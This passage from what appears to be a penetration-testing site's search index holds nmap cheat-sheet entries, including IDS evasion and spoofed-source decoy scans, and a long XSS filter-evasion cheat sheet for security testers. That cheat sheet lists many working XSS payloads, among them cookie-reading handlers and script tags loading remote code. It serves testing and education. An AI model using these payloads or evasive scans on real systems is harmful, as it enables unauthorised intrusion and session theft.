"penetration-testing/cheatsheets/nmap-cheatsheet/#timing-and-performance", "text": "Switch Description Example -T0 nmap 192.168.1.1 -T0 Paranoid (0) Intrusion DetectionSystem evasion -T1 nmap 192.168.1.1 -T1 Sneaky (1) Intrusion Detection Systemevasion -T2 nmap 192.168.1.1 -T2 Polite (2) slows down the scan to useless bandwidth and use less target machine resources -T3 nmap 192.168.1.1 -T3 Normal (3) which is default speed -T4 nmap 192.168.1.1 -T4 Aggressive (4) speeds scans; assumes you are on a reasonably fast and reliable network -T5 nmap 192.168.1.1 -T5 Insane (5) speeds scan; assumes you are on an extraordinarily fast network -------- -------- ------------------------------------------------------------------------------------------- --host-timeout 1s; 4m; 2h Give up on target after this long --min-rtt-timeout/max-rtt-timeout/initial-rtt-timeout 1s; 4m; 2h Specifies probe round trip time --min-hostgroup/max-hostgroup <size 50; 1024 Parallel host scan group sizes --min-parallelism/max-parallelism 10; 1 Probe parallelization --scan-delay/--max-scan-delay 20ms; 2s; 4m; 5h Adjust delay between probes --max-retries 3 Specify the maximum number of port scan probe retransmissions --min-rate 100 Send packets no slower than per second --max-rate 100 Send packets no faster than per second", "title": "Timing and Performance"}, {"location": "penetration-testing/cheatsheets/nmap-cheatsheet/#nse-scripts", "text": "Switch Description Example -sC nmap 192.168.1.1 -sC Scan with default NSE scripts. Considered useful for discovery and safe --script default nmap 192.168.1.1 --script default Scan with default NSE scripts. Considered useful for discovery and safe --script nmap 192.168.1.1 --script=banner Scan with a single script. Example banner --script nmap 192.168.1.1 --script=http* Scan with a wildcard. Example http --script nmap 192.168.1.1 --script=http,banner Scan with two scripts. Example http and banner --script nmap 192.168.1.1 --script \"not intrusive\" Scan default, but remove intrusive scripts --script-args nmap --script snmp-sysdescr --script-args snmpcommunity=admin 192.168.1.1 NSE script with arguments", "title": "NSE Scripts"}, {"location": "penetration-testing/cheatsheets/nmap-cheatsheet/#useful-nse-script-examples", "text": "Command Description nmap -Pn --script=http-sitemap-generator scanme.nmap.org http site map generator nmap -n -Pn -p 80 --open -sV -vvv --script banner,http-title -iR 1000 Fast search for random web servers nmap -Pn --script=dns-brute domain.com Brute forces DNS hostnames guessing subdomains nmap -n -Pn -vv -O -sV --script smb-enum ,smb-ls,smb-mbenum,smb-os-discovery,smb-s ,smb-vuln ,smbv2 -vv 192.168.1.1 Safe SMB scripts to run nmap --script whois* domain.com Whois query nmap -p80 --script http-unsafe-output-escaping scanme.nmap.org Detect cross site scripting vulnerabilities nmap -p80 --script http-sql-injection scanme.nmap.org Check for SQL injections", "title": "Useful NSE Script Examples"}, {"location": "penetration-testing/cheatsheets/nmap-cheatsheet/#firewall-ids-evasion-and-spoofing", "text": "Switch Description Example -f nmap 192.168.1.1 -f Requested scan (including ping scans) use tiny fragmented IP packets. Harder for packet filters --mtu nmap 192.168.1.1 --mtu 32 Set your own offset size -D nmap -D 192.168.1.101,192.168.1.102, 192.168.1.103,192.168.1.23 192.168.1.1 Send scans from spoofed IPs -D nmap -D decoy-ip1,decoy-ip2,your-own-ip,decoy-ip3,decoy-ip4 remote-host-ip Above example explained -S nmap -S www.microsoft.com www.facebook.com Scan Facebook from Microsoft (-e eth0 -Pn may be required) -g nmap -g 53 192.168.1.1 Use given source port number --proxies nmap --proxies http://192.168.1.1:8080 , http://192.168.1.2:8080 192.168.1.1 Relay connections through HTTP/SOCKS4 proxies --data-length nmap --data-length 200 192.168.1.1 Appends random data to sent packets", "title": "Firewall / IDS Evasion and Spoofing"}, {"location": "penetration-testing/cheatsheets/nmap-cheatsheet/#example-ids-evasion-command", "text": "nmap -f -t 0 -n -Pn \u2013data-length 200 -D 192 .168.1.101,192.168.1.102,192.168.1.103,192.168.1.23 192 .168.1.1", "title": "Example IDS Evasion command"}, {"location": "penetration-testing/cheatsheets/nmap-cheatsheet/#output", "text": "Switch Description Example -oN nmap 192.168.1.1 -oN normal.file Normal output to the file normal.file -oX nmap 192.168.1.1 -oX xml.file XML output to the file xml.file -oG nmap 192.168.1.1 -oG grep.file Grepable output to the file grep.file -oA nmap 192.168.1.1 -oA results Output in the three major formats at once -oG - nmap 192.168.1.1 -oG - Grepable output to screen. -oN -, -oX - also usable --append-output nmap 192.168.1.1 -oN file.file --append-output Append a scan to a previous scan file -v nmap 192.168.1.1 -v Increase the verbosity level (use -vv or more for greater effect) -d nmap 192.168.1.1 -d Increase debugging level (use -dd or more for greater effect) --reason nmap 192.168.1.1 --reason Display the reason a port is in a particular state, same output as -vv --open nmap 192.168.1.1 --open Only show open (or possibly open) ports --packet-trace nmap 192.168.1.1 -T4 --packet-trace Show all packets sent and received --iflist nmap --iflist Shows the host interfaces and routes --resume nmap --resume results.file Resume a scan", "title": "Output"}, {"location": "penetration-testing/cheatsheets/nmap-cheatsheet/#helpful-nmap-output-examples", "text": "Scan for web servers and grep to show which IPs are running web servers nmap -p80 -sV -oG - --open 192 .168.1.1/24 | grep open Generate a list of the IPs of live hosts nmap -iR 10 -n -oX out.xml | grep \"Nmap\" | cut -d \" \" -f5 > live-hosts.txt Append IP to the list of live hosts nmap -iR 10 -n -oX out2.xml | grep \"Nmap\" | cut -d \" \" -f5 >> live-hosts.txt Compare output from nmap using the ndif ndiff scanl.xml scan2.xml Convert nmap xml files to html files xsltproc nmap.xml -o nmap.html Reverse sorted list of how often ports turn up grep \" open \" results.nmap | sed -r 's/ +/ /g' | sort | uniq -c | sort -rn | less", "title": "Helpful Nmap Output examples"}, {"location": "penetration-testing/cheatsheets/nmap-cheatsheet/#miscellaneous-options", "text": "Switch Description Example -6 nmap -6 2607:f0d0:1002:51::4 Enable IPv6 scanning -h nmap -h nmap help screen", "title": "Miscellaneous Options"}, {"location": "penetration-testing/cheatsheets/nmap-cheatsheet/#other-useful-nmap-commands", "text": "Discovery only on ports x, no port scan nmap -iR 10 -PS22-25,80,113,1050,35000 -v -sn Arp discovery only on local network, no port scan nmap 192 .168.1.1-1/24 -PR -sn -vv Traceroute to random targets, no port scan nmap -iR 10 -sn -traceroute Query the Internal DNS for hosts, list targets only nmap 192 .168.1.1-50 -sL --dns-server 192 .168.1.1", "title": "Other Useful Nmap Commands"}, {"location": "penetration-testing/cheatsheets/xss-cheatsheet/", "text": "XSS CheatSheet \u00b6 Introduction \u00b6 This article is focused on providing application security testing professionals with a guide to assist in Cross Site Scripting testing. The initial contents of this article were donated to OWASP by RSnake, from his seminal XSS CheatSheet, which was at: http://ha.ckers.org/xss.html . That site now redirects to its new home here, where we plan to maintain and enhance it. The very first OWASP Prevention CheatSheet, the Cross Site Scripting Prevention CheatSheet , was inspired by RSnake's XSS CheatSheet, so we can thank RSnake for our inspiration. We wanted to create short, simple guidelines that developers could follow to prevent XSS, rather than simply telling developers to build apps that could protect against all the fancy tricks specified in rather complex attack CheatSheet, and so the OWASP CheatSheet Series was born. This CheatSheet lists a series of XSS attacks that can be used to bypass certain XSS defensive filters. Please note that input filtering is an incomplete defense for XSS which these tests can be used to illustrate. Basic XSS Test Without Filter Evasion \u00b6 This is a normal XSS JavaScript injection, and most likely to get caught but I suggest trying it first (the quotes are not required in any modern browser so they are omitted here): < SCRIPT SRC = http://xss.rocks/xss.js ></ SCRIPT > XSS Locator (Polygot) \u00b6 The following is a \"polygot test XSS payload.\" This test will execute in multiple contexts including html, script string, js and url. Thank you to Gareth Heyes for this contribution . `javascript:/*--> </ title ></ style ></ textarea ></ script ></ xmp >< svg / onload = '+/\"/+/onmouseover=1/+/[*/[]/+alert(1)//' > Image XSS Using the JavaScript Directive \u00b6 Image XSS using the JavaScript directive (IE7.0 doesn't support the JavaScript directive in context of an image, but it does in other contexts, but the following show the principles that would work in other tags as well: < img src = \"javascript:alert('XSS');\" /> No Quotes and no Semicolon \u00b6 < IMG SRC = javascript:alert('XSS') > Case Insensitive XSS Attack Vector \u00b6 < IMG SRC = JaVaScRiPt:alert('XSS') > HTML Entities \u00b6 The semicolons are required for this to work: < img src = 'javascript:alert(\"XSS\")' /> Grave Accent Obfuscation \u00b6 If you need to use both double and single quotes you can use a grave accent to encapsulate the JavaScript string - this is also useful because lots of cross site scripting filters don't know about grave accents: < IMG SRC = `javascript:alert(\"RSnake says , ' XSS '\")` > Malformed A Tags \u00b6 Skip the HREF attribute and get to the meat of the XXS... Submitted by David Cross ~ Verified on Chrome `\\ < a onmouseover = \"alert(document.cookie)\" \\ > xxs link\\ < /a\\> or Chrome loves to replace missing quotes for you... if you ever get stuck just leave them off and Chrome will put them in the right place and fix your missing quotes on a URL or script. `\\ < a onmouseover = alert(document.cookie)\\ > xxs link\\ < /a\\> Malformed IMG Tags \u00b6 Originally found by Begeek (but cleaned up and shortened to work in all browsers), this XSS vector uses the relaxed rendering engine to create our XSS vector within an IMG tag that should be encapsulated within quotes. I assume this was originally meant to correct sloppy coding. This would make it significantly more difficult to correctly parse apart an HTML tags: < IMG \"\"\" > < script > alert ( 'XSS' ); </ script > \"\\> fromCharCode \u00b6 If no quotes of any kind are allowed you can eval() a fromCharCode in JavaScript to create any XSS vector you need: < img src = \"javascript:alert(String.fromCharCode(88,83,83))\" /> Default SRC Tag to Get Past Filters that Check SRC Domain \u00b6 This will bypass most SRC domain filters. Inserting javascript in an event method will also apply to any HTML tag type injection that uses elements like Form, Iframe, Input, Embed etc. It will also allow any relevant event for the tag type to be substituted like onblur , onclick giving you an extensive amount of variations for many injections listed here. Submitted by David Cross . < img src = \"#\" onmouseover = \"alert('xxs')\" /> Default SRC Tag by Leaving it Empty \u00b6 < img src = \"onmouseover\" =\" alert (' xxs ')\" /> Default SRC Tag by Leaving it out Entirely \u00b6 < img onmouseover = \"alert('xxs')\" /> On Error Alert \u00b6 < IMG SRC = / onerror = \"alert(String.fromCharCode(88,83,83))\" ></ img > IMG onerror and JavaScript Alert Encode \u00b6 < img src = x onerror = \"&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041\" > Decimal HTML Character References \u00b6 All of the XSS examples that use a javascript: directive inside of an <IMG tag will not work in Firefox or Netscape 8.1+ in the Gecko rendering engine mode). < img src = \"&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#88;&#83;&#83;&#39;&#41;\" /> Decimal HTML Character References Without Trailing Semicolons \u00b6 This is often effective in XSS that attempts to look for \"&#XX;\", since most people don't know about padding - up to 7 numeric characters total. This is also useful against people who decode against strings like \\(tmp_string =\\~ s/.\\*\\\\&\\#(\\\\d+);.\\*/\\) 1/; which incorrectly assumes a semicolon is required to terminate a html encoded string (I've seen this in the wild): < img src = \"&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041\" /> Hexadecimal HTML Character References Without Trailing Semicolons \u00b6 This is also a viable XSS attack against the above string \\(tmp_string=\\~ s/.\\*\\\\&\\#(\\\\d+);.\\*/\\) 1/; which assumes that there is a numeric character following the pound symbol - which is not true with hex HTML characters). < img src = \"&#x6A&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x3A&#x61&#x6C&#x65&#x72&#x74&#x28&#x27&#x58&#x53&#x53&#x27&#x29\" /> Embedded Tab \u00b6 Used to break up the cross site scripting attack: < img src = \"jav ascript:alert('XSS');\" /> Embedded Encoded Tab \u00b6 Use this one to break up XSS : < img src = \"jav&#x09;ascript:alert('XSS');\" /> Embedded Newline to Break-up XSS \u00b6 Some websites claim that any of the chars 09-13 (decimal) will work for this attack. That is incorrect. Only 09 (horizontal tab), 10 (newline) and 13 (carriage return) work. See the ascii chart for more details. The following four XSS examples illustrate this vector: < img src = \"jav&#x0A;ascript:alert('XSS');\" /> Embedded Carriage Return to Break-up XSS \u00b6 (Note: with the above I am making these strings longer than they have to be because the zeros could be omitted. Often I've seen filters that assume the hex and dec encoding has to be two or three characters. The real rule is 1-7 characters.): < img src = \"jav&#x0D;ascript:alert('XSS');\" /> Null breaks up JavaScript Directive \u00b6 Null chars also work as XSS vectors but not like above, you need to inject them directly using something like Burp Proxy or use %00 in the URL string or if you want to write your own injection tool you can either use vim ( ^V^@ will produce a null) or the following program to generate it into a text file. Okay, I lied again, older versions of Opera (circa 7.11 on Windows) were vulnerable to one additional char 173 (the soft hypen control char). But the null char %00 is much more useful and helped me bypass certain real world filters with a variation on this example: `perl -e 'print \" < IMG SRC = java\\0script:alert(\\\"XSS\\\") > \";' > out` Spaces and Meta Chars Before the JavaScript in Images for XSS \u00b6 This is useful if the pattern match doesn't take into account spaces in the word javascript: -which is correct since that won't render- and makes the false assumption that you can't have a space between the quote and the javascript: keyword. The actual reality is you can have any char from 1-32 in decimal: < img src = \" &#14; javascript:alert('XSS');\" /> Non-alpha-non-digit XSS \u00b6 The Firefox HTML parser assumes a non-alpha-non-digit is not valid after an HTML keyword and therefor considers it to be a whitespace or non-valid token after an HTML tag. The problem is that some XSS filters assume that the tag they are looking for is broken up by whitespace. For example \\<SCRIPT\\\\s != \\<SCRIPT/XSS\\\\s : < SCRIPT / XSS SRC = \"http://xss.rocks/xss.js\" ></ SCRIPT > Based on the same idea as above, however,expanded on it, using Rnake fuzzer. The Gecko rendering engine allows for any character other than letters, numbers or encapsulation chars (like quotes, angle brackets, etc...) between the event handler and the equals sign, making it easier to bypass cross site scripting blocks. Note that this also applies to the grave accent char as seen here: < BODY onload !#$%&()*~+ -_ ., : ;?@[/|\\]^`= alert (\" XSS \") > Yair Amit brought this to my attention that there is slightly different behavior between the IE and Gecko rendering engines that allows just a slash between the tag and the parameter with no spaces. This could be useful if the system does not allow spaces. < SCRIPT / SRC = \"http://xss.rocks/xss.js\" ></ SCRIPT > Extraneous Open Brackets \u00b6 Submitted by Franz Sedlmaier, this XSS vector could defeat certain detection engines that work by first using matching pairs of open and close angle brackets and then by doing a comparison of the tag inside, instead of a more efficient algorythm like Boyer-Moore that looks for entire string matches of the open angle bracket and associated tag (post de-obfuscation, of course). The double slash comments out the ending extraneous bracket to supress a JavaScript error: < < script > alert ( 'XSS' ); //\\< </ script > No Closing Script Tags \u00b6 In Firefox and Netscape 8.1 in the Gecko rendering engine mode you don't actually need the \\></SCRIPT> portion of this Cross Site Scripting vector. Firefox assumes it's safe to close the HTML tag and add closing tags for you. How thoughtful! Unlike the next one, which doesn't effect Firefox, this does not require any additional HTML below it. You can add quotes if you need to, but they're not needed generally, although beware, I have no idea what the HTML will end up looking like once this is injected: < SCRIPT SRC = http://xss.rocks/xss.js?< B > Protocol Resolution in Script Tags \u00b6 This particular variant was submitted by \u0141ukasz Pilorz and was based partially off of Ozh's protocol resolution bypass below. This cross site scripting example works in IE, Netscape in IE rendering mode and Opera if you add in a </SCRIPT> tag at the end. However, this is especially useful where space is an issue, and of course, the shorter your domain, the better. The \".j\" is valid, regardless of the encoding type because the browser knows it in context of a SCRIPT tag. < SCRIPT SRC = //xss.rocks/.j > Half Open HTML/JavaScript XSS Vector \u00b6 Unlike Firefox the IE rendering engine doesn't add extra data to you page, but it does allow the javascript: directive in images. This is useful as a vector because it doesn't require a close angle bracket. This assumes there is any HTML tag below where you are injecting this cross site scripting vector. Even though there is no close \">\" tag the tags below it will close it. A note: this does mess up the HTML, depending on what HTML is beneath it. It gets around the following NIDS regex: /((\\\\%3D)|(=))\\[^\\\\n\\]\\*((\\\\%3C)|\\<)\\[^\\\\n\\]+((\\\\%3E)|\\>)/ because it doesn't require the end \">\". As a side note, this was also affective against a real world XSS filter I came across using an open ended <IFRAME tag instead of an <IMG tag: < IMG SRC = \"`<javascript:alert>`('XSS')\" ` Double Open Angle Brackets \u00b6 Using an open angle bracket at the end of the vector instead of a close angle bracket causes different behavior in Netscape Gecko rendering. Without it, Firefox will work but Netscape won't: < iframe src = http://xss.rocks/scriptlet.html <` Escaping JavaScript Escapes \u00b6 When the application is written to output some user information inside of a JavaScript like the following: <SCRIPT>var a=\"$ENV{QUERY\\_STRING}\";</SCRIPT> and you want to inject your own JavaScript into it but the server side application escapes certain quotes you can circumvent that by escaping their escape character. When this gets injected it will read <SCRIPT>var a=\"\\\\\\\\\";alert('XSS');//\";</SCRIPT> which ends up un-escaping the double quote and causing the Cross Site Scripting vector to fire. The XSS locator uses this method.: `\\\";alert('XSS');//` An alternative, if correct JSON or Javascript escaping has been applied to the embedded data but not HTML encoding, is to finish the script block and start your own: </ script >< script > alert ( 'XSS' );</ script > End Title Tag \u00b6 This is a simple XSS vector that closes <TITLE> tags, which can encapsulate the malicious cross site scripting attack: </ TITLE >< SCRIPT > alert ( \"XSS\" );</ SCRIPT > INPUT Image \u00b6 < input type = \"IMAGE\" src = \"javascript:alert('XSS');\" /> BODY Image \u00b6 < body background = \"javascript:alert('XSS')\" ></ body > IMG Dynsrc \u00b6 < img DYNSRC = \"javascript:alert('XSS')\" /> IMG Lowsrc \u00b6 < img LOWSRC = \"javascript:alert('XSS')\" /> List-style-image \u00b6 Fairly esoteric issue dealing with embedding images for bulleted lists. This will only work in the IE rendering engine because of the JavaScript directive. Not a particularly useful cross site scripting vector: < STYLE > li { list-style-image : url ( \"javascript:alert('XSS')\" );}</ STYLE >< UL >< LI > XSS </ br > VBscript in an Image \u00b6 < img src = 'vbscript:msgbox(\"XSS\")' /> Livescript (older versions of Netscape only) \u00b6 < img src = \"livescript:[code]\" /> SVG Object Tag \u00b6 < svg / onload = alert('XSS') > ECMAScript 6 \u00b6 Set.constructor`alert\\x28document.domain\\x29 BODY Tag \u00b6 Method doesn't require using any variants of javascript: or <SCRIPT... to accomplish the XSS attack). Dan Crowley additionally noted that you can put a space before the equals sign ( onload= != onload = ): < BODY ONLOAD = alert('XSS') > Event Handlers \u00b6 It can be used in similar XSS attacks to the one above (this is the most comprehensive list on the net, at the time of this writing). Thanks to Rene Ledosquet for the HTML+TIME updates. FSCommand() (attacker can use this when executed from within an embedded Flash object) onAbort() (when user aborts the loading of an image) onActivate() (when object is set as the active element) onAfterPrint() (activates after user prints or previews print job) onAfterUpdate() (activates on data object after updating data in the source object) onBeforeActivate() (fires before the object is set as the active element) onBeforeCopy() (attacker executes the attack string right before a selection is copied to the clipboard - attackers can do this with the execCommand(\"Copy\") function) onBeforeCut() (attacker executes the attack string right before a selection is cut) onBeforeDeactivate() (fires right after the activeElement is changed from the current object) onBeforeEditFocus() (Fires before an object contained in an editable element enters a UI-activated state or when an editable container object is control selected) onBeforePaste() (user needs to be tricked into pasting or be forced into it using the execCommand(\"Paste\") function) onBeforePrint() (user would need to be tricked into printing or attacker could use the print() or execCommand(\"Print\") function). onBeforeUnload() (user would need to be tricked into closing the browser - attacker cannot unload windows unless it was spawned from the parent) onBeforeUpdate() (activates on data object before updating data in the source object) onBegin() (the onbegin event fires immediately when the element's timeline begins) onBlur() (in the case where another popup is loaded and window looses focus) onBounce() (fires when the behavior property of the marquee object is set to \"alternate\" and the contents of the marquee reach one side of the window) onCellChange() (fires when data changes in the data provider) onChange() (select, text, or TEXTAREA field loses focus and its value has been modified) onClick() (someone clicks on a form) onContextMenu() (user would need to right click on attack area) onControlSelect() (fires when the user is about to make a control selection of the object) onCopy() (user needs to copy something or it can be exploited using the execCommand(\"Copy\") command) onCut() (user needs to copy something or it can be exploited using the execCommand(\"Cut\") command) onDataAvailable() (user would need to change data in an element, or attacker could perform the same function) onDataSetChanged() (fires when the data set exposed by a data source object changes) onDataSetComplete() (fires to indicate that all data is available from the data source object) onDblClick() (user double-clicks a form element or a link) onDeactivate() (fires when the activeElement is changed from the current object to another object in the parent document) onDrag() (requires that the user drags an object) onDragEnd() (requires that the user drags an object) onDragLeave() (requires that the user drags an object off a valid location) onDragEnter() (requires that the user drags an object into a valid location) onDragOver() (requires that the user drags an object into a valid location) onDragDrop() (user drops an object (e.g. file) onto the browser window) onDragStart() (occurs when user starts drag operation) onDrop() (user drops an object (e.g. file) onto the browser window) onEnd() (the onEnd event fires when the timeline ends. onError() (loading of a document or image causes an error) onErrorUpdate() (fires on a databound object when an error occurs while updating the associated data in the data source object) onFilterChange() (fires when a visual filter completes state change) onFinish() (attacker can create the exploit when marquee is finished looping) onFocus() (attacker executes the attack string when the window gets focus) onFocusIn() (attacker executes the attack string when window gets focus) onFocusOut() (attacker executes the attack string when window looses focus) onHashChange() (fires when the fragment identifier part of the document's current address changed) onHelp() (attacker executes the attack string when users hits F1 while the window is in focus) onInput() (the text content of an element is changed through the user interface) onKeyDown() (user depresses a key) onKeyPress() (user presses or holds down a key) onKeyUp() (user releases a key) onLayoutComplete() (user would have to print or print preview) onLoad() (attacker executes the attack string after the window loads) onLoseCapture() (can be exploited by the releaseCapture() method) onMediaComplete() (When a streaming media file is used, this event could fire before the file starts playing) onMediaError() (User opens a page in the browser that contains a media file, and the event fires when there is a problem) onMessage() (fire when the document received a message) onMouseDown() (the attacker would need to get the user to click on an image) onMouseEnter() (cursor moves over an object or area) onMouseLeave() (the attacker would need to get the user to mouse over an image or table and then off again) onMouseMove() (the attacker would need to get the user to mouse over an image or table) onMouseOut() (the attacker would need to get the user to mouse over an image or table and then off again) onMouseOver() (cursor moves over an object or area) onMouseUp() (the attacker would need to get the user to click on an image) onMouseWheel() (the attacker would need to get the user to use their mouse wheel) onMove() (user or attacker would move the page) onMoveEnd() (user or attacker would move the page) onMoveStart() (user or attacker would move the page) onOffline() (occurs if the browser is working in online mode and it starts to work offline) onOnline() (occurs if the browser is working in offline mode and it starts to work online) onOutOfSync() (interrupt the element's ability to play its media as defined by the timeline) onPaste() (user would need to paste or attacker could use the execCommand(\"Paste\") function) onPause() (the onpause event fires on every element that is active when the timeline pauses, including the body element) onPopState() (fires when user navigated the session history) onProgress() (attacker would use this as a flash movie was loading) onPropertyChange() (user or attacker would need to change an element property) onReadyStateChange() (user or attacker would need to change an element property) onRedo() (user went forward in undo transaction history) onRepeat() (the event fires once for each repetition of the timeline, excluding the first full cycle) onReset() (user or attacker resets a form) onResize() (user would resize the window; attacker could auto initialize with something like: <SCRIPT>self.resizeTo(500,400);</SCRIPT> ) onResizeEnd() (user would resize the window; attacker could auto initialize with something like: <SCRIPT>self.resizeTo(500,400);</SCRIPT> ) onResizeStart() (user would resize the window; attacker could auto initialize with something like: <SCRIPT>self.resizeTo(500,400);</SCRIPT> ) onResume() (the onresume event fires on every element that becomes active when the timeline resumes, including the body element) onReverse() (if the element has a repeatCount greater than one, this event fires every time the timeline begins to play backward) onRowsEnter() (user or attacker would need to change a row in a data source) onRowExit() (user or attacker would need to change a row in a data source) onRowDelete() (user or attacker would need to delete a row in a data source) onRowInserted() (user or attacker would need to insert a row in a data source) onScroll() (user would need to scroll, or attacker could use the scrollBy() function) onSeek() (the onreverse event fires when the timeline is set to play in any direction other than forward) onSelect() (user needs to select some text - attacker could auto initialize with something like: window.document.execCommand(\"SelectAll\"); ) onSelectionChange() (user needs to select some text - attacker could auto initialize with something like: window.document.execCommand(\"SelectAll\"); ) onSelectStart() (user needs to select some text - attacker could auto initialize with something like: window.document.execCommand(\"SelectAll\"); ) onStart() (fires at the beginning of each marquee loop) onStop() (user would need to press the stop button or leave the webpage) onStorage() (storage area changed) onSyncRestored() (user interrupts the element's ability to play its media as defined by the timeline to fire) onSubmit() (requires attacker or user submits a form) onTimeError() (user or attacker sets a time property, such as dur, to an invalid value) onTrackChange() (user or attacker changes track in a playList) onUndo() (user went backward in undo transaction history) onUnload() (as the user clicks any link or presses the back button or attacker forces a click) onURLFlip() (this event fires when an Advanced Streaming Format (ASF) file, played by a HTML+TIME (Timed Interactive Multimedia Extensions) media tag, processes script commands embedded in the ASF file) seekSegmentTime() (this is a method that locates the specified point on the element's segment time line and begins playing from that point. The segment consists of one repetition of the time line including reverse play using the AUTOREVERSE attribute.) BGSOUND \u00b6 < bgsound SRC = \"javascript:alert('XSS');\" ></ bgsound > & JavaScript includes \u00b6 < br SIZE = \"&{alert('XSS')}\" /> STYLE sheet \u00b6 < link rel = \"stylesheet\" href = \"javascript:alert('XSS');\" /> Remote style sheet \u00b6 Using something as simple as a remote style sheet you can include your XSS as the style parameter can be redefined using an embedded expression. This only works in IE and Netscape 8.1+ in IE rendering engine mode. Notice that there is nothing on the page to show that there is included JavaScript. Note: With all of these remote style sheet examples they use the body tag, so it won't work unless there is some content on the page other than the vector itself, so you'll need to add a single letter to the page to make it work if it's an otherwise blank page: < link rel = \"stylesheet\" href = \"http://xss.rocks/xss.css\" /> Remote style sheet part 2 \u00b6 This works the same as above, but uses a <STYLE> tag instead of a <LINK> tag). A slight variation on this vector was used to hack Google Desktop. As a side note, you can remove the end </STYLE> tag if there is HTML immediately after the vector to close it. This is useful if you cannot have either an equals sign or a slash in your cross site scripting attack, which has come up at least once in the real world: < style > @ import 'http://xss.rocks/xss.css' ; </ style > Remote style sheet part 3 \u00b6 This only works in Opera 8.0 (no longer in 9.x) but is fairly tricky. According to RFC2616 setting a link header is not part of the HTTP1.1 spec, however some browsers still allow it (like Firefox and Opera). The trick here is that I am setting a header (which is basically no different than in the HTTP header saying Link: <http://xss.rocks/xss.css>; REL=stylesheet ) and the remote style sheet with my cross site scripting vector is running the JavaScript, which is not supported in FireFox: < meta http-equiv = \"Link\" content = \"<http://xss.rocks/xss.css>; REL=stylesheet\" /> Remote style sheet part 4 \u00b6 This only works in Gecko rendering engines and works by binding an XUL file to the parent page. I think the irony here is that Netscape assumes that Gecko is safer and therefor is vulnerable to this for the vast majority of sites: < style > BODY { -moz- binding : url ( 'http://xss.rocks/xssmoz.xml#xss' ); } </ style > STYLE Tags with Broken-up JavaScript for XSS \u00b6 This XSS at times sends IE into an infinite loop of alerts: < style > @ im \\ port '\\ja\\vasc\\ript:alert(\"XSS\")' ; </ style > STYLE Attribute using a Comment to Break-up Expression \u00b6 Created by Roman Ivanov < img style = \"xss:expr/*XSS*/ession(alert('XSS'))\" /> IMG STYLE with Expression \u00b6 This is really a hybrid of the above XSS vectors, but it really does show how hard STYLE tags can be to parse apart, like above this can send IE into a loop: exp/* < a style = 'no\\xss:noxss(\"*//*\"); xss:ex/*XSS*//*/*/pression(alert(\"XSS\"))' ></ a > STYLE Tag (Older versions of Netscape only) \u00b6 < style type = \"text/javascript\" > alert ( 'XSS' ); </ style > STYLE Tag using Background-image \u00b6 < style > . XSS { background-image : url ( \"javascript:alert('XSS')\" ); }</ style >< a class = \"XSS\" ></ a > STYLE Tag using Background \u00b6 < style type = \"text/css\" > BODY { background : url ( \"javascript:alert('XSS')\" ); }</ style > ` ` < style type = \"text/css\" > BODY { background : url ( \"<javascript:alert>('XSS')\" ); } </ style > Anonymous HTML with STYLE Attribute \u00b6 IE6.0 and Netscape 8.1+ in IE rendering engine mode don't really care if the HTML tag you build exists or not, as long as it starts with an open angle bracket and a letter: < XSS STYLE = \"xss:expression(alert('XSS'))\" ></ XSS > Local htc File \u00b6 This is a little different than the above two cross site scripting vectors because it uses an .htc file which must be on the same server as the XSS vector. The example file works by pulling in the JavaScript and running it as part of the style attribute: < XSS STYLE = \"behavior: url(xss.htc);\" ></ XSS > US-ASCII Encoding \u00b6 US-ASCII encoding (found by Kurt Huwig).This uses malformed ASCII encoding with 7 bits instead of 8. This XSS may bypass many content filters but only works if the host transmits in US-ASCII encoding, or if you set the encoding yourself. This is more useful against web application firewall cross site scripting evasion than it is server side filter evasion. Apache Tomcat is the only known server that transmits in US-ASCII encoding. `\u00bcscript\u00bealert(\u00a2XSS\u00a2)\u00bc/script\u00be` META \u00b6 The odd thing about meta refresh is that it doesn't send a referrer in the header - so it can be used for certain types of attacks where you need to get rid of referring URLs: < meta http-equiv = \"refresh\" content = \"0;url=data:text/html base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K\" /> IFRAME \u00b6 If iframes are allowed there are a lot of other XSS problems as well: < iframe src = \"javascript:alert('XSS');\" ></ iframe > IFRAME Event Based \u00b6 IFrames and most other elements can use event based mayhem like the following... (Submitted by: David Cross) < iframe src = \"#\" onmouseover = \"alert(document.cookie)\" ></ iframe > FRAME \u00b6 Frames have the same sorts of XSS problems as iframes < FRAMESET >< FRAME SRC = \"javascript:alert('XSS');\" ></ FRAMESET > TABLE \u00b6 < table BACKGROUND = \"javascript:alert('XSS')\" ></ table > TD \u00b6 Just like above, TD's are vulnerable to BACKGROUNDs containing JavaScript XSS vectors: < table > < td BACKGROUND = \"javascript:alert('XSS')\" ></ td > </ table > DIV \u00b6 DIV Background-image \u00b6 < div style = \"background-image: url(javascript:alert('XSS'))\" ></ div > DIV Background-image with Unicoded XSS Exploit \u00b6 This has been modified slightly to obfuscate the url parameter. The original vulnerability was found by Renaud Lifchitz as a vulnerability in Hotmail: < div style = \"background-image:\\0075\\0072\\006C\\0028'\\006a\\0061\\0076\\0061\\0073\\0063\\0072\\0069\\0070\\0074\\003a\\0061\\006c\\0065\\0072\\0074\\0028.1027\\0058.1053\\0053\\0027\\0029'\\0029\" ></ div > DIV Background-image Plus Extra Characters \u00b6 Rnaske built a quick XSS fuzzer to detect any erroneous characters that are allowed after the open parenthesis but before the JavaScript directive in IE and Netscape 8.1 in secure site mode. These are in decimal but you can include hex and add padding of course. (Any of the following chars can be used: 1-32, 34, 39, 160, 8192-8.13, 12288, 65279): < div style = \"background-image: url(javascript:alert('XSS'))\" ></ div > DIV Expression \u00b6 A variant of this was effective against a real world cross site scripting filter using a newline between the colon and \"expression\": < div style = \"width: expression(alert('XSS'));\" ></ div > Downlevel-Hidden Block \u00b6 Only works in IE5.0 and later and Netscape 8.1 in IE rendering engine mode). Some websites consider anything inside a comment block to be safe and therefore does not need to be removed, which allows our Cross Site Scripting vector. Or 